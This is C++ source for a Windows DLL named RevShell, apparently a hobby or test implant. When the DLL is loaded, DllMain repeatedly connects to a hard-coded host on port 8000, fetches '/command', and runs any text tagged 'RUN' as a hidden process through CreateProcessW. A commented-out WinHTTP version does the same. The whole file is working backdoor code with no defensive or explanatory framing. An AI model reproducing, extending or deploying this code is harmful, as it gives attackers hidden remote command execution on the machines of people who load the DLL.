// RevShell.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "pch.h"

//#pragma comment(lib, "winhttp.lib")
//
//std::vector<std::string> SplitString(const std::string& str, char delimiter) {
//    std::vector<std::string> tokens;
//    std::stringstream ss(str);
//    std::string token;
//    while (std::getline(ss, token, delimiter)) {
//        tokens.push_back(token);
//    }
//    return tokens;
//}
//void ExecuteCommand(const std::string& command) {
//    int result = system(command.c_str());
//
//}


std::vector<std::string> split(const std::string& str, const std::string& delimiter) {
    std::vector<std::string> tokens;
    size_t prev = 0, pos = 0;
    do {
        pos = str.find(delimiter, prev);
        if (pos == std::string::npos) pos = str.length();
        std::string token = str.substr(prev, pos - prev);
        if (!token.empty()) tokens.push_back(token);
        prev = pos + delimiter.length();
    } while (pos < str.length() && prev < str.length());
    return tokens;
}

void pr_error() {
    DWORD lserr = GetLastError();
    char buffer[32];
    wchar_t wtext[20];
    mbstowcs(wtext, buffer, strlen(buffer) + 1);
    swprintf(wtext, sizeof(wtext)/sizeof(wchar_t), L"%d", lserr);

    MessageBoxW(NULL, wtext, L"test", MB_OK);
    return;
}
void executeCommand(const std::string& command) {
    /*system(command.c_str());*/

    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    ZeroMemory(&pi, sizeof(pi));

    
    std::wstring wcommand(command.begin(), command.end());

    
    if (!CreateProcessW(NULL, &wcommand[0], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        pr_error();
        return;
    }

    
    WaitForSingleObject(pi.hProcess, INFINITE);

    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}
void init() {
    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct sockaddr_in serverAddress;


    const char* serverIp = "192.168.178.51";
    const char* sendbuf = "GET /command HTTP/1.1\r\n"
        "Host: www.growlser.com\r\n"
        "Connection: close\r\n\r\n";

    char recvbuf[DEFAULT_BUFLEN];
    int result;
    int recvbuflen = DEFAULT_BUFLEN;
    
    result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        pr_error();
        return;
    }
    ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (ConnectSocket == INVALID_SOCKET) {
        pr_error();
        WSACleanup();
        return;
    }
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = htons(8000);
    inet_pton(AF_INET, serverIp, &serverAddress.sin_addr);

    result = connect(ConnectSocket, (struct sockaddr*)&serverAddress, sizeof(serverAddress));
    if (result == SOCKET_ERROR) {
        pr_error();
        closesocket(ConnectSocket);
        WSACleanup();
        return;
    }

    result = send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
    if (result == SOCKET_ERROR) {
        pr_error();
        closesocket(ConnectSocket);
        WSACleanup();
        return;
    }
    std::string response;
    do {
        result = recv(ConnectSocket, recvbuf, recvbuflen, 0);
        if (result > 0) {
            response.append(recvbuf, result);
           /* wchar_t wtext[DEFAULT_BUFLEN+1];
            mbstowcs(wtext, recvbuf, strlen(recvbuf) + 1);
            MessageBox(NULL, wtext, L"", MB_OK);*/
        }
        
        
        
        
    } while (result > 0);
    std::vector<std::string> tokens = split(response, "<|>");
    for (size_t i = 0; i < tokens.size(); ++i) {
        if (tokens[i] == "RUN" && i + 1 < tokens.size()) {
            std::string command = tokens[i + 1];
            std::cout << "Executing command: " << command << std::endl;
            executeCommand(command);
        }
    }
    closesocket(ConnectSocket);
    WSACleanup();
}

void init2()
{
    //// Definisci variabili
    //HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    //BOOL bResults = FALSE;
    //DWORD dwSize = 0;
    //DWORD dwDownloaded = 0;
    //LPSTR pszOutBuffer;
    //BOOL  bKeepReading = TRUE;
    //DWORD dwStatusCode = 0;
    //DWORD dwTemp = sizeof(dwStatusCode);

    //LPCWSTR serverName = L"192.168.178.67";
    //LPCWSTR resourcePath = L"/command";

    //
    //hSession = WinHttpOpen(L"Windows chrome/1.0",
    //    WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
    //    WINHTTP_NO_PROXY_NAME,
    //    WINHTTP_NO_PROXY_BYPASS, 0);

    //if (hSession) {
    //    hConnect = WinHttpConnect(hSession, serverName,
    //        8000, 0);
    //}
    //
    //if (hConnect) {

    //    hRequest = WinHttpOpenRequest(hConnect, L"GET", resourcePath,
    //        NULL, WINHTTP_NO_REFERER,
    //        WINHTTP_DEFAULT_ACCEPT_TYPES,
    //        0);
    //    MessageBox(NULL, L"Open Req", L"test", MB_OK);
    //}
    //if (hRequest) {
    //    bResults = WinHttpSendRequest(hRequest,
    //        WINHTTP_NO_ADDITIONAL_HEADERS, 0,
    //        WINHTTP_NO_REQUEST_DATA, 0,
    //        0, 0);
    //    DWORD lserr = GetLastError();
    //    char buffer[32];
    //    wchar_t wtext[20];
    //    mbstowcs(wtext, buffer, strlen(buffer) + 1);
    //    wsprintf(wtext, L"%d", lserr);

    //    MessageBox(NULL, wtext, L"test", MB_OK);
    //    MessageBox(NULL, L"WinHttpSendRequest", L"test", MB_OK);
    //   
    //}
   

    //if (bResults) {
    //    bResults = WinHttpReceiveResponse(hRequest, NULL);
    //    MessageBox(NULL, L"WinHttpReceiveResponse", L"test", MB_OK);
    //}

    //if (bResults) {
    //    WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
    //        WINHTTP_HEADER_NAME_BY_INDEX, &dwStatusCode, &dwTemp, WINHTTP_NO_HEADER_INDEX);
    //    if (dwStatusCode == 200) {
    //        std::string response;
    //        do {

    //            dwSize = 0;
    //            if (WinHttpQueryDataAvailable(hRequest, &dwSize)) {
    //                pszOutBuffer = (LPSTR)malloc(dwSize + 1);
    //                if (!pszOutBuffer) {

    //                    dwSize = 0;
    //                }
    //                else {

    //                    ZeroMemory(pszOutBuffer, dwSize + 1);

    //                    if (WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
    //                        dwSize, &dwDownloaded)) {

    //                        response.append(pszOutBuffer, dwDownloaded);
    //                        std::vector<std::string> tokens = SplitString(response, ' ');
    //                        if (!tokens.empty() && tokens[0] == "RUN") {
    //                            std::string command = response.substr(4);

    //                            ExecuteCommand(command);
    //                        }
    //                    }
    //                    free(pszOutBuffer);
    //                }
    //            }
    //        } while (dwSize > 0);
    //    }

    //}


    //if (hRequest) WinHttpCloseHandle(hRequest);
    //if (hConnect) WinHttpCloseHandle(hConnect);
    //if (hSession) WinHttpCloseHandle(hSession);


    return;


}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        for (int i = 0; i < 5; i++) {
            
            
            init();
            Sleep(10000);
        }
        
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

